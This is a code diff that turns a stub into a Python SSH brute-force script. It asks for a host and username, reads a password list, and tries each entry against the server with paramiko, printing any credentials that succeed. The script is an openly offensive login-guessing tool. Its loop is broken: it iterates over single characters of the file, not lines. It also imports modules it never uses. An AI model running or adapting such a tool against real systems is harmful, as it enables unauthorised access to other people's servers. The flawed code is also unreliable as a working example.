@@ -2,22 +2,39 @@
 # os.system('standard way to connect to ssh')
 # python-nmap
 # paramiko
+from socket import socket
+from time import sleep
+
+import paramiko
+import pwnedpasswords
+
 
 def start():
     # TODO clear the screen and print an ssh banner 
     host = input("What is the Host? ")
+    username = input("What is the Username? ")
     print(host)
-    # ideas
-    # ask the user if they know the username or want to use a list
-    # ask the user if they want to load a password list
-
-    # for each passwords and user attempt to login
-
-
-
+    f = open('./passlist', 'r')
+    passwords = f.read()
+    # 5 mins 
+    # python get file text by line
+    for password in passwords:
+      connected = attempt_to_login(host, username, password)
+      if connected:
+        sleep(5)
+        return
 
 def attempt_to_login(host: str, username: str, password: str):
-  print("TODO figure out how to attempt an ssh login")
-  # ssh username@host -p password
-  # if the attack worked or login was successful 
-  # close the connection and print the correct username and password
+  try:
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print(f'[-] --- Attempting to login with {host}, {username}, {password}')
+    ssh.connect(host, username=username, password=password, timeout=1.5)
+    ssh.close()
+    print(f'[!] SUCCESSFULLY CONNECTED WITH {username}@{host} :password {password}')
+    return True
+  except paramiko.AuthenticationException:
+    print('Invalid Credentials bad username or password')
+  except:
+    print("SOMETHING WENT WRONG")
+  return False
